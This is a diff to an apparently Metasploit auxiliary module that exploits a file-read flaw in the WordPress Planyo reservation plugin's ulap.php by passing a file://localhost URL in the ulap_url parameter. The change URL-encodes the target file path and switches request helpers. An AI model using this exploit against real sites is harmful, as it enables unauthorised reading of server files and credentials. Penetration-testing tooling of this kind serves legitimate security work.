@@ -131,11 +131,14 @@ class MetasploitModule < Msf::Auxiliary
       'planyo-online-reservation-system',
       'ulap.php'
     )
-    route += "?ulap_url=file://localhost#{datastore['FILEPATH']}"
+    # Escape the file URL's path components before the outer GET parameter.
+    # Keep existing slashes and literal percent sequences in the filename.
+    file_path = datastore['FILEPATH'].split('/', -1).map { |segment| URI.encode_www_form_component(segment).gsub('+', '%20') }.join('/')
 
-    res = send_request_raw({
+    res = send_request_cgi({
       'method' => 'GET',
-      'uri' => route
+      'uri' => route,
+      'vars_get' => { 'ulap_url' => "file://localhost#{file_path}" }
     })
 
     unless res
